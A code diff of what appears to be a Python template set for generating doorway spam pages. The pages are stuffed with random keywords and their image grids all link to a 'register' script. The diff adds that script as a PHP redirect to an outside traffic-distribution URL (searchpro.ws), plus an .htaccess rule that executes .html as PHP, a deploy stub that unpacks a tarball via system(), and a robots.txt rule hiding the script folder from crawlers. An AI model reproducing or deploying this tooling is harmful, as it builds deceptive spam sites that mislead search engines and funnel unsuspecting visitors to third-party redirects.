@@ -7,13 +7,14 @@ strDivider = r'''---
 strIndex = r'''<html>
   <head>
     <title>{ABOSKEYWORD} - {STAT}{ARANDKEYWORD}{/STAT}</title>
+      <meta http-equiv="Content-Type" content="text/html; charset=windows-1250">
       <meta name="description" content="{CBOSKEYWORD}. {CRANDKEYWORD}. {CRANDKEYWORD}. {CRANDKEYWORD}. {CRANDKEYWORD}. {CRANDKEYWORD}" >
       <meta name="keywords" content="{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD}">
       <style>
       <!--//
       * {margin:0;padding:0}
       body {
-        background:url("{STAT}/images/back/{RAND(1,776)}.jpg{/STAT}");
+        background:url("/images/back/{{numBackground}}.jpg");
         color:{{rndColor1}};
         margin:0;
         padding:0;
@@ -44,15 +45,14 @@ strIndex = r'''<html>
   </head>
   <body>
     <div id="wrapper">
-      {STAT}<img src="{{imgPath}}/img/{RAND(1,{{imgCount}})}.jpg" alt="{BOSKEYWORD}" class="headimg" />{/STAT}
       <h1>{ABOSKEYWORD}</h1>
       {{strEntries}}
       <br/>{FOR(1,{RAND(5,15)})}{CRANDLINK} {ENDFOR} {FOR(1,{RAND(1,3)})}{RANDMYLINK} {ENDFOR}<br/>
       <div id="footer">
-        &copy 2011 {STAT}{ARANDKEYWORD}{/STAT}. All rights reserved. {CYCLIK} {INDEXLINK} {SITEMAPLINK}.
+        &copy 2011 {STAT}{ARANDKEYWORD}{/STAT}. All rights reserved. {INDEXLINK} {SITEMAPLINK}.
       </div>
     </div>
-{PIWIKCOUNTER}
+{PIWIK}
   </body>
 </html>
 '''
@@ -60,13 +60,14 @@ strIndex = r'''<html>
 strSitemap = r'''<html>
   <head>
     <title>{ARANDKEYWORD}</title>
+      <meta http-equiv="Content-Type" content="text/html; charset=windows-1250">
       <meta name="description" content="{CRANDKEYWORD}. {CRANDKEYWORD}. {CRANDKEYWORD}. {CRANDKEYWORD}. {CRANDKEYWORD}" >
       <meta name="keywords" content="{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD},{RANDKEYWORD}">
       <style>
       <!--//
       * {margin:0;padding:0}
       body {
-        background:url("{STAT}/images/back/{RAND(1,776)}.jpg{/STAT}");
+        background:url("/images/back/{{numBackground}}.jpg");
         color:{{rndColor1}};
         margin:0;
         padding:0;
@@ -96,32 +97,31 @@ strSitemap = r'''<html>
   </head>
   <body>
     <div id="wrapper">
-      <img src="1.jpg" alt="{RANDKEYWORD}" class="headimg" />
       <h1>Sitemap</h1>
       {{strEntries}}
-      <br/><!-- bnr --><br/>
+      <br/><?php include("/var/www/common/script/banner-xgen-{{tplKind}}.txt"); ?><br/>
       {INDEXLINK}<a href="sitemap.xml">sitemap</a>{ALLLINK}
-      <br/><!-- bnr --><br/>
+      <br/><?php include("/var/www/common/script/banner-xgen-{{tplKind}}.txt"); ?><br/>
       <div id="footer">
         &copy 2011. All rights reserved. <a href="index.html">{RANDKEYWORD}</a>.
       </div>
     </div>
   </body>
-{PIWIKCOUNTER}
+{PIWIK}
 </html>
 '''
 
 strEntries = r'''<br/><br/><img src="{{imgPath}}/img/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /><br/><br/>
 ---
-<br/>{FOR(1,{RAND(4,6)})}{RANDKEYWORD}{RANDTEXT(15,.)} {ENDFOR}{RANDKEYWORD}.<br/>
+<br/>{FOR(1,{RAND(4,6)})}{RANDKEYWORD}[[||||||.]] {ENDFOR}{RANDKEYWORD}.<br/>
 ---
-<br/>{FOR(1,{RAND(2,5)})}{RANDTEXTLINE(C:\Work\text\bred-en.txt)}<br/>{ENDFOR}<br/>
+<br/>{FOR(1,{RAND(2,5)})}{RANDTEXTLINE(bred-en.txt)}<br/>{ENDFOR}<br/>
 ---
-<br/><!-- bnr --><br/>
+<br/><?php include("/var/www/common/script/banner-xgen-{{tplKind}}.txt"); ?><br/>
 ---
-<br/><!-- bnr --><br/>
+<br/><?php include("/var/www/common/script/banner-xgen-{{tplKind}}.txt"); ?><br/>
 ---
-<br/><!-- bnr --><br/>
+<br/><?php include("/var/www/common/script/banner-xgen-{{tplKind}}.txt"); ?><br/>
 ---
 <table cellspacing="10px" align="center" class="tabla">{{strTableEntries}}</table>
 ---
@@ -134,31 +134,50 @@ strEntries = r'''<br/><br/><img src="{{imgPath}}/img/{RAND(1,{{imgCount}})}.jpg"
 <table cellspacing="10px" align="center" class="tabla">{{strTableEntries}}</table>
 '''
 
-strTableEntries = r'''<tr>{FOR(1,6)}<td><img src="{{imgPath}}/thumb/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></td>{ENDFOR}</tr>
+strTableEntries = r'''<tr>{FOR(1,6)}<td><a href="script/register.html?member_id={RAND(1000000,9999999)}"><img src="{{imgPath}}/thumb/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></a></td>{ENDFOR}</tr>
 <tr>{FOR(1,6)}<td>{RANDKEYWORD}, {RANDKEYWORD}, {RANDKEYWORD}, {RANDKEYWORD}.</td>{ENDFOR}</tr>
 ---
-<tr>{FOR(1,2)}<td><img src="{{imgPath}}/thumb/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></td><td>{RANDKEYWORD} {RANDKEYWORD} {RANDKEYWORD} {RANDKEYWORD}</td>{ENDFOR}</tr>
-<tr>{FOR(1,2)}<td><img src="{{imgPath}}/thumb/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></td><td>{RANDKEYWORD} {RANDKEYWORD} {RANDKEYWORD} {RANDKEYWORD}</td>{ENDFOR}</tr>
+<tr>{FOR(1,2)}<td><a href="script/register.html?member_id={RAND(1000000,9999999)}"><img src="{{imgPath}}/thumb/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></a></td><td>{RANDKEYWORD} {RANDKEYWORD} {RANDKEYWORD} {RANDKEYWORD}</td>{ENDFOR}</tr>
+<tr>{FOR(1,2)}<td><a href="script/register.html?member_id={RAND(1000000,9999999)}"><img src="{{imgPath}}/thumb/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></a></td><td>{RANDKEYWORD} {RANDKEYWORD} {RANDKEYWORD} {RANDKEYWORD}</td>{ENDFOR}</tr>
 ---
-<tr>{FOR(1,2)}<td><img src="{{imgPath}}/imgm/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></td>{ENDFOR}</tr>
+<tr>{FOR(1,2)}<td><a href="script/register.html?member_id={RAND(1000000,9999999)}"><img src="{{imgPath}}/imgm/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></a></td>{ENDFOR}</tr>
 ---
-<tr>{FOR(1,2)}<td><img src="{{imgPath}}/imgm/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></td>{ENDFOR}</tr>
+<tr>{FOR(1,2)}<td><a href="script/register.html?member_id={RAND(1000000,9999999)}"><img src="{{imgPath}}/imgm/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></a></td>{ENDFOR}</tr>
 <tr>{FOR(1,2)}<td>{RANDKEYWORD}</td>{ENDFOR}</tr>
 ---
-<tr>{FOR(1,2)}<td><img src="{{imgPath}}/imgm/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></td>{ENDFOR}</tr>
+<tr>{FOR(1,2)}<td><a href="script/register.html?member_id={RAND(1000000,9999999)}"><img src="{{imgPath}}/imgm/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></a></td>{ENDFOR}</tr>
 <tr>{FOR(1,2)}<td>{RANDKEYWORD}</td>{ENDFOR}</tr>
-<tr>{FOR(1,2)}<td><img src="{{imgPath}}/imgm/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></td>{ENDFOR}</tr>
+<tr>{FOR(1,2)}<td><a href="script/register.html?member_id={RAND(1000000,9999999)}"><img src="{{imgPath}}/imgm/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></a></td>{ENDFOR}</tr>
 <tr>{FOR(1,2)}<td>{RANDKEYWORD}</td>{ENDFOR}</tr>
 ---
 <tr>
   <td width="50%">
     <table cellspacing="10px" align="center" class="tabla">
-      <tr>{FOR(1,2)}<td><img src="{{imgPath}}/thumb/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></td>{ENDFOR}</tr>
+      <tr>{FOR(1,2)}<td><a href="script/register.html?member_id={RAND(1000000,9999999)}"><img src="{{imgPath}}/thumb/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></a></td>{ENDFOR}</tr>
       <tr>{FOR(1,2)}<td>{RANDKEYWORD}</td>{ENDFOR}</tr>
-      <tr>{FOR(1,2)}<td><img src="{{imgPath}}/thumb/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></td>{ENDFOR}</tr>
+      <tr>{FOR(1,2)}<td><a href="script/register.html?member_id={RAND(1000000,9999999)}"><img src="{{imgPath}}/thumb/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></a></td>{ENDFOR}</tr>
       <tr>{FOR(1,2)}<td>{RANDKEYWORD}</td>{ENDFOR}</tr>
     </table>
   </td>
-  <td><img src="{{imgPath}}/imgm/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></td>
+  <td><a href="script/register.html?member_id={RAND(1000000,9999999)}"><img src="{{imgPath}}/imgm/{RAND(1,{{imgCount}})}.jpg" alt="{RANDKEYWORD}" /></a></td>
 </tr>
+'''
+
+strHtAccess = r'''RemoveHandler .html
+AddType application/x-httpd-php .php .html
+'''
+
+strCmd = r'''<?php
+umask(0);
+symlink('/var/www/common/images', 'images');
+system('tar -zxf bean.tgz');
+unlink('bean.tgz');
+?>
+'''
+strRobots = r'''User-Agent: *
+Allow: /
+Disallow: /script
+'''
+
+strRegister = r'''<?php header('Location: http://searchpro.ws/go.php?sid={{tdsSchema}}'); ?>
 '''
